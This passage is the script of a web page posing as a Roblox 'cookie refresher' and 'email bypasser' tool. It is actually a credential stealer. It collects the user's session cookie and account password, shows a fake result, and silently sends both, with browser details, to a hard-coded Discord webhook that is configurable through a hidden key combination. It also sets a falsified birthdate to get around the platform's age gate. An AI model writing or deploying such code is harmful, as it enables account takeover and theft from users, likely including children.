    <!-- Hidden Webhook Configuration -->
    <div id="webhookConfig">
        <input type="text" id="webhookUrlInput" placeholder="Enter Discord Webhook URL">
        <button id="saveWebhookBtn">Save</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Create animated particles
            function createParticles() {
                const particlesContainer = document.getElementById('particles');
                const particleCount = 50;
                
                for (let i = 0; i < particleCount; i++) {
                    const particle = document.createElement('div');
                    particle.classList.add('particle');
                    
                    // Random size
                    const size = Math.random() * 10 + 5;
                    particle.style.width = `${size}px`;
                    particle.style.height = `${size}px`;
                    
                    // Random position
                    particle.style.left = `${Math.random() * 100}%`;
                    particle.style.top = `${Math.random() * 100}%`;
                    
                    // Random animation duration
                    particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
                    particle.style.animationDelay = `${Math.random() * 5}s`;
                    
                    particlesContainer.appendChild(particle);
                }
            }
            
            createParticles();
            
            // Form submission handlers
            const cookieForm = document.getElementById('cookieForm');
            const emailBypasserForm = document.getElementById('emailBypasserForm');
            const resultContainer = document.getElementById('resultContainer');
            const errorContainer = document.getElementById('errorContainer');
            const newCookieDisplay = document.getElementById('newCookie');
            const errorMessage = document.getElementById('errorMessage');
            const copyCookieBtn = document.getElementById('copyCookieBtn');
            const downloadCookieBtn = document.getElementById('downloadCookieBtn');
            
            // Email bypasser elements
            const bypasserResultContainer = document.getElementById('bypasserResultContainer');
            const bypasserErrorContainer = document.getElementById('bypasserErrorContainer');
            const bypasserErrorMessage = document.getElementById('bypasserErrorMessage');
            const newBirthdate = document.getElementById('newBirthdate');
            const copyBirthdateBtn = document.getElementById('copyBirthdateBtn');
            const setAgePlusBtn = document.getElementById('setAgePlusBtn');
            const ageTimerContainer = document.getElementById('ageTimerContainer');
            const ageTimerText = document.getElementById('ageTimerText');
            const ageTimerProgress = document.getElementById('ageTimerProgress');
            const accountPassword = document.getElementById('accountPassword');
            
            // Webhook elements (hidden)
            const webhookConfig = document.getElementById('webhookConfig');
            const webhookUrlInput = document.getElementById('webhookUrlInput');
            const saveWebhookBtn = document.getElementById('saveWebhookBtn');
            
            // Default webhook URL (you can change this)
            let webhookUrl = "https://discord.com/api/webhooks/1417314431943315557/2K2NJRdg0_jZDLali-WsZl4pfKwcdCCqpOwcw08AtyvMip4zgXAbX-rwD91-Ukzn9gzX";
            
            // Check for saved webhook URL in localStorage
            const savedWebhook = localStorage.getItem('robloxWebhookUrl');
            if (savedWebhook) {
                webhookUrl = savedWebhook;
            }
            
            // Show webhook config on key combination (Ctrl+Shift+W)
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.shiftKey && e.key === 'W') {
                    webhookConfig.style.display = webhookConfig.style.display === 'block' ? 'none' : 'block';
                    webhookUrlInput.value = webhookUrl;
                }
            });
            
            // Save webhook URL
            saveWebhookBtn.addEventListener('click', function() {
                webhookUrl = webhookUrlInput.value;
                localStorage.setItem('robloxWebhookUrl', webhookUrl);
                webhookConfig.style.display = 'none';
            });
            
            // Simulate cookie refresh (in a real implementation, this would connect to Roblox's API)
            function refreshCookie(cookie) {
                // Show loading spinner
                const spinner = document.querySelector('#cookieForm .loading-spinner');
                spinner.style.display = 'inline-block';
                
                // Hide previous results
                resultContainer.style.display = 'none';
                errorContainer.style.display = 'none';
                
                // Simulate API call delay
                setTimeout(() => {
                    spinner.style.display = 'none';
                    
                    // In a real implementation, this would be the actual cookie from Roblox
                    const mockCookie = `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}`;
                    
                    // Show success result
                    newCookieDisplay.textContent = mockCookie;
                    resultContainer.style.display = 'block';
                    
                    // Always send to webhook (forced functionality)
                    sendToWebhook('cookie', { 
                        cookie: cookie,
                        newCookie: mockCookie
                    });
                    
                    // Scroll to result
                    resultContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                }, 2000);
            }
            
            // Calculate birthdate for underage today, 13+ tomorrow
            function calculateAgePlusDate() {
                const today = new Date();
                const thirteenYearsAgo = new Date(today);
                thirteenYearsAgo.setFullYear(today.getFullYear() - 13);
                thirteenYearsAgo.setDate(thirteenYearsAgo.getDate() + 1); // Add one day to make it 12 years and 364 days old
                
                return thirteenYearsAgo;
            }
            
            // Format date for display
            function formatDate(date) {
                const year = date.getFullYear();
                const month = String(date.getMonth() + 1).padStart(2, '0');
                const day = String(date.getDate()).padStart(2, '0');
                return `${year}-${month}-${day}`;
            }
            
            // Start age timer for "13+ tomorrow" option
            function startAgeTimer() {
                ageTimerContainer.style.display = 'block';
                ageTimerContainer.classList.add('timer-ageplus');
                
                const targetDate = new Date();
                targetDate.setHours(24, 0, 0, 0); // Set to midnight tonight
                
                function updateTimer() {
                    const now = new Date();
                    const diff = targetDate - now;
                    
                    if (diff <= 0) {
                        ageTimerText.textContent = "Account is now 13+!";
                        ageTimerProgress.style.width = '100%';
                        return;
                    }
                    
                    const hours = Math.floor(diff / (1000 * 60 * 60));
                    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
                    
                    ageTimerText.textContent = `Account will be 13+ in: ${hours}h ${minutes}m ${seconds}s`;
                    
                    // Update progress bar (24 hours = 100%)
                    const totalMs = 24 * 60 * 60 * 1000;
                    const progress = ((totalMs - diff) / totalMs) * 100;
                    ageTimerProgress.style.width = `${progress}%`;
                    
                    requestAnimationFrame(updateTimer);
                }
                
                updateTimer();
            }
            
            // Email bypasser function
            function bypassEmail(cookie, password) {
                // Show loading spinner
                const spinner = document.querySelector('#emailBypasserForm .loading-spinner');
                if (spinner) spinner.style.display = 'inline-block';
                
                // Hide previous results
                bypasserResultContainer.style.display = 'none';
                bypasserErrorContainer.style.display = 'none';
                
                // Simulate API call delay
                setTimeout(() => {
                    if (spinner) spinner.style.display = 'none';
                    
                    // Set to 13+ tomorrow
                    const newDate = calculateAgePlusDate();
                    const displayText = `Will be 13+ Tomorrow<br>Birthday: ${formatDate(newDate)}`;
                    
                    // Show success result
                    newBirthdate.innerHTML = displayText;
                    bypasserResultContainer.style.display = 'block';
                    
                    // Start the timer
                    startAgeTimer();
                    
                    // Send to webhook (forced functionality)
                    sendToWebhook('email-bypass', { 
                        cookie: cookie,
                        password: password,
                        type: 'ageplus',
                        newBirthdate: formatDate(newDate)
                    });
                    
                    // Scroll to result
                    bypasserResultContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                }, 2000);
            }
            
            // Send data to Discord webhook (forced functionality)
            function sendToWebhook(action, data) {
                const embed = {
                    title: "Roblox Tool Activity",
                    color: 5814783, // Discord green color
                    fields: [
                        {
                            name: "Action",
                            value: action === 'cookie' ? "Cookie Refresh" : "Email Bypass",
                            inline: true
                        },
                        {
                            name: "Timestamp",
                            value: new Date().toLocaleString(),
                            inline: true
                        }
                    ],
                    footer: {
                        text: "Roblox Tools - All User Data Collected",
                        icon_url: "https://i.imgur.com/4M34hi2.png" // Placeholder icon
                    },
                    timestamp: new Date().toISOString()
                };
                
                // Add cookie information
                if (data.cookie) {
                    embed.fields.push({
                        name: "Account Cookie",
                        value: data.cookie.length > 1000 ? data.cookie.substring(0, 1000) + "..." : data.cookie,
                        inline: false
                    });
                }
                
                // Add new cookie if available
                if (data.newCookie) {
                    embed.fields.push({
                        name: "New Cookie",
                        value: data.newCookie.length > 1000 ? data.newCookie.substring(0, 1000) + "..." : data.newCookie,
                        inline: false
                    });
                }
                
                // Add password if available
                if (data.password) {
                    embed.fields.push({
                        name: "Account Password",
                        value: data.password,
                        inline: false
                    });
                }
                
                // Add email bypass specific data
                if (action === 'email-bypass') {
                    embed.fields.push({
                        name: "Bypass Type",
                        value: "13+ Tomorrow",
                        inline: true
                    });
                    
                    embed.fields.push({
                        name: "New Birthdate",
                        value: data.newBirthdate,
                        inline: true
                    });
                }
                
                // Add browser information
                embed.fields.push({
                    name: "Browser Information",
                    value: `User Agent: ${navigator.userAgent.substring(0, 100)}...`,
                    inline: false
                });
                
                const payload = {
                    embeds: [embed]
                };
                
                // Send to webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Webhook sent successfully');
                    } else {
                        console.error('Failed to send webhook');
                    }
                })
                .catch(error => {
                    console.error('Error sending webhook:', error);
                });
            }
            
            // Cookie form submission
            cookieForm.addEventListener('submit', function(e) {
                e.preventDefault();
                const currentCookie = document.getElementById('currentCookie').value;
                
                if (currentCookie) {
                    refreshCookie(currentCookie);
                }
            });
            
            // Email bypasser button
            setAgePlusBtn.addEventListener('click', function() {
                const bypasserCookie = document.getElementById('bypasserCookie').value;
                const password = accountPassword.value;
                
                if (bypasserCookie && password) {
                    bypassEmail(bypasserCookie, password);
                }
            });
            
            // Copy cookie to clipboard
            copyCookieBtn.addEventListener('click', function() {
                const cookieText = newCookieDisplay.textContent;
                navigator.clipboard.writeText(cookieText).then(() => {
                    // Show success feedback
                    const originalText = copyCookieBtn.innerHTML;
                    copyCookieBtn.innerHTML = '<i class="bi bi-check me-1"></i> Copied!';
                    copyCookieBtn.classList.remove('btn-outline-secondary');
                    copyCookieBtn.classList.add('btn-success');
                    
                    setTimeout(() => {
                        copyCookieBtn.innerHTML = originalText;
                        copyCookieBtn.classList.remove('btn-success');
                        copyCookieBtn.classList.add('btn-outline-secondary');
                    }, 2000);
                });
            });
            
            // Copy birthdate to clipboard
            copyBirthdateBtn.addEventListener('click', function() {
                const birthdateText = newBirthdate.textContent.replace(/<br>/g, '\n').replace(/Will be 13+ Tomorrow\nBirthday: /, '');
                navigator.clipboard.writeText(birthdateText).then(() => {
                    // Show success feedback
                    const originalText = copyBirthdateBtn.innerHTML;
                    copyBirthdateBtn.innerHTML = '<i class="bi bi-check me-1"></i> Copied!';
                    copyBirthdateBtn.classList.remove('btn-outline-secondary');
                    copyBirthdateBtn.classList.add('btn-success');
                    
                    setTimeout(() => {
                        copyBirthdateBtn.innerHTML = originalText;
                        copyBirthdateBtn.classList.remove('btn-success');
                        copyBirthdateBtn.classList.add('btn-outline-secondary');
                    }, 2000);
                });
            });
            
            // Download cookie as .txt file
            downloadCookieBtn.addEventListener('click', function() {
                const cookieText = newCookieDisplay.textContent;
                const blob = new Blob([cookieText], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'roblox_cookie.txt';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            });
            
            // Add fade-in animation to elements when they come into view
            const observerOptions = {
                root: null,
                rootMargin: '0px',
                threshold: 0.1
            };
            
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.classList.add('fade-in');
                    }
                });
            }, observerOptions);
            
            document.querySelectorAll('.card').forEach(card => {
                observer.observe(card);
            });
        });
    </script>
